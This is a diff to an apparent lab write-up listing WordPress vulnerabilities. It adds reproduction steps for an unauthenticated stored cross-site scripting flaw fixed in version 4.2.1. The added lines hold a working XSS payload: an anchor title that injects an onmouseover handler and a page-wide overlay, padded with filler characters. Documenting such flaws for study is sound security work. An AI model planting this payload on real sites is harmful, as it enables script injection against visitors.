@@ -23,7 +23,9 @@ Exploit 2. Unauthenticated Stored Cross Site-Scripting (XSS)
     - Fixed in version: 4.2.1
   - [ ] GIF Walkthrough: 
   - [ ] Steps to recreate: 
-        1. 
+        1. <a title='x onmouseover=alert(unescape(/hello%20world/.source))
+style=position:absolute;left:0;top:0;width:5000px;height:5000px
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
 Exploit 3. Application Denial of Service (DoS)
